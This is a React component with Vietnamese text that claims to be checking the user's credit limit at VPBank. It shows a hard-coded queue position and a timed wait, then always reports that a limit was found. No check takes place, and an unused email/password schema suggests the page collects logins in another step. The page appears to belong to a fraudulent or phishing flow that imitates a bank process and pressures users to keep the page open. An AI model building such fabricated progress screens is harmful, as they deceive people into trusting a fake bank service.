import React, { useState, useEffect } from 'react';
import JarvisFormStyle from './JarvisFormStyle';
import { Link } from 'react-router-dom';
import { useForm } from 'react-hook-form';
import { yupResolver } from '@hookform/resolvers';
import * as yup from 'yup';
import Header from './Header';

const schema = yup.object().shape({
	auth_email: yup
		.string()
		.email('This field must be a valid email')
		.required('Email is required'),
	password: yup.string().required('Password is required'),
});

export default function Round2Confirm(props) {

	const { register, handleSubmit, errors } = useForm({
		reValidateMode: 'onChange',
		shouldFocusError: true,
		shouldUnregister: true,
		defaultValues: {},
		resolver: yupResolver(schema),
	});

	function onSubmitForm() {

	}

	const [checkLimit, setCheckLimit] = useState(1);
	useEffect(() => {
		setTimeout(() => {
			setCheckLimit(checkLimit + 1);
		}, 1000);
	});

	return (
		<JarvisFormStyle>
			<Header className="header" />
			<div className="roundTitle">BƯỚC 2:</div>
			<div className="roundName">CHỨNG MINH THU NHẬP & KIỂM TRA HẠN MỨC</div>
			<div className="roundNamesub">Đang kiểm tra hạn mức</div>
			<div className="roundNameDescription">
				Chúng tôi đang kiểm tra hạn mức của bạn tại ngân hàng VPBank, quá trình này có thể diễn ra trong vài phút, bạn có thể xem quy trình đầy đủ của chúng tôi tại video dưới đây
			</div>
			<iframe style={{ width: '90%', borderRadius: '8px', marginTop: '15px' }} height='250'
				src='https://www.youtube.com/embed/Fmn6yWkalU0?ecver=2' frameBorder='0' allowFullScreen
			/>
			{checkLimit < 600 &&
				<div className="checkLimitContainer">
					<div className="waitingTitle">Đang chờ tới lượt 23/200</div>
					<div className="waitingDescription">Chúng tôi đang xử lý nhiều hồ sơ cùng lúc, vui lòng chờ
tới lượt để nhận kết quả</div>
					<div className="waitingNote">
						Nếu bạn tắt trình duyệt lúc này sẽ phải đăng nhập lại
		. Vì vậy chúng tôi khuyên bạn nên giữ nguyên
trang này. Thông tin đến bạn!</div>
				</div>
			}
			{checkLimit > 600 &&
				<>
					<div className="checkLimitDone">
						<div className="title">Đã kiểm tra xong hạn mức </div>
						<div className="text">Bạn đã có hạn mức, nhấn tiếp tục để đi tiếp</div>
					</div>
					<button onClick={() => props.setStep(8)} type="button" className="btn btnSubmit">
						Tiếp tục
        			</button>

				</>
			}
			<button onClick={() => props.setStep(8)} type="button" className="btn btnKeep">
				Bỏ qua
        			</button>
		</JarvisFormStyle>
	)
}


